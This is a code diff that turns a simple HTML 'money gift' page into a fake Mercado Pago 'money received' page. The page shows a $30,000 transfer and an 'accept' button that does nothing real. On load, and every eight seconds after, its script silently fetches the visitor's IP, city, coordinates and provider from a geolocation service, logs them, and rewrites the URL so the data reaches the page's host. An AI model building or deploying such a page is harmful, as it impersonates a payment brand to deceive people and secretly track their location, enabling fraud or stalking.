@@ -3,65 +3,192 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Regalo de Dinero</title>
+    <title>Mercado Pago - Dinero recibido</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            padding: 20px;
         }
+
         .container {
-            background-color: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            background-color: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+            padding: 32px 24px;
+            max-width: 420px;
+            width: 100%;
             text-align: center;
-            max-width: 400px;
         }
-        h1 {
-            color: #4CAF50;
+
+        .logo {
+            width: 140px;
+            height: auto;
+            margin-bottom: 24px;
         }
-        p {
+
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #000;
+        }
+
+        .message {
             font-size: 18px;
-            margin-bottom: 30px;
+            line-height: 1.4;
+            color: #333;
+            margin-bottom: 16px;
         }
-        button {
-            background-color: #4CAF50;
-            color: white;
-            padding: 15px 30px;
+
+        .amount {
+            font-size: 36px;
+            font-weight: 800;
+            color: #000;
+            margin: 16px 0 32px;
+        }
+
+        .button {
+            background-color: #ffe600;
+            color: #000000;
+            font-size: 18px;
+            font-weight: 700;
+            padding: 16px 32px;
             border: none;
-            border-radius: 5px;
-            font-size: 16px;
+            border-radius: 8px;
+            width: 100%;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: background-color 0.2s ease;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
         }
-        button:hover {
-            background-color: #45a049;
+
+        .button:hover {
+            background-color: #f0d600;
+        }
+
+        .button:active {
+            background-color: #e0c200;
+        }
+
+        .status {
+            margin-top: 24px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .success {
+            color: #00a650;
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <h1>¡Felicidades!</h1>
-        <p>X persona te regala 30.000 pesos.</p>
-        <button onclick="aceptarDinero()">Aceptar Dinero</button>
+        <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/9/98/Mercado_Pago.svg" 
+            alt="Mercado Pago" 
+            class="logo"
+            onerror="this.src='https://http2.mlstatic.com/storage/developers-site-cms-admin/15f6d4b0-6d3b-11eb-9c5d-07f548c2f0e0-mercado-pago-logo.png';"
+        >
+
+        <h1 class="title">¡Te llegó dinero!</h1>
+
+        <p class="message">
+            <strong>Una persona</strong> te envió
+        </p>
+
+        <div class="amount">$30.000</div>
+
+        <button class="button" onclick="aceptarDinero()">
+            Aceptar dinero
+        </button>
+
+        <div class="status" id="status">Procesando...</div>
     </div>
 
     <script>
-        function aceptarDinero() {
+        let intervalId = null;
+
+        // Obtener parámetros actuales de la URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const hasParams = urlParams.has('ip') || urlParams.has('city');
+
+        function obtenerYLoguearUbicacion() {
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
-                    console.log('Geolocalización por IP:', data);
+                    const timestamp = new Date().toLocaleString();
+
+                    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+                    console.log(`Geolocalización por IP - ${timestamp}`);
+                    console.log('IP:', data.ip || 'N/A');
+                    console.log('Ciudad:', data.city || 'N/A');
+                    console.log('Región:', data.region || 'N/A');
+                    console.log('País:', data.country_name || 'N/A');
+                    console.log('Latitud:', data.latitude || 'N/A');
+                    console.log('Longitud:', data.longitude || 'N/A');
+                    console.log('Proveedor:', data.org || data.asn || 'N/A');
+                    console.log('Datos completos:', data);
+                    console.log('URL actual con params:', window.location.href);
+                    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+
+                    document.getElementById('status').innerHTML = 
+                        '<span class="success">Procesado ✓</span> (revisa consola)';
+
+                    // Si NO hay parámetros → redirigir con ellos (solo una vez)
+                    if (!hasParams) {
+                        const params = new URLSearchParams({
+                            ip: data.ip || 'N/A',
+                            city: data.city || 'N/A',
+                            region: data.region || 'N/A',
+                            country: data.country_name || 'N/A',
+                            lat: data.latitude || 'N/A',
+                            lon: data.longitude || 'N/A',
+                            t: Date.now()  // timestamp para evitar cache
+                        });
+
+                        const newUrl = `${window.location.pathname}?${params.toString()}`;
+                        window.location.replace(newUrl);  // replace para no crear historia
+                    }
                 })
                 .catch(error => {
-                    console.error('Error al obtener la geolocalización:', error);
+                    console.error('Error al obtener ubicación:', error);
+                    document.getElementById('status').textContent = 'Error al procesar';
                 });
         }
+
+        // Iniciar al cargar
+        window.onload = function() {
+            obtenerYLoguearUbicacion();  // Primera ejecución inmediata
+
+            // Loop continuo cada 8 segundos (logs en consola + URL actual se ve en barra)
+            intervalId = setInterval(obtenerYLoguearUbicacion, 8000);
+        };
+
+        // Botón de aceptación (solo UI)
+        function aceptarDinero() {
+            alert('¡Dinero aceptado! 🎉');
+            document.getElementById('status').innerHTML = 
+                '<span class="success">Dinero aceptado ✓</span><br>Seguimos registrando ubicación';
+        }
+
+        // Limpieza
+        window.onbeforeunload = function() {
+            if (intervalId) clearInterval(intervalId);
+        };
     </script>
+
 </body>
 </html>
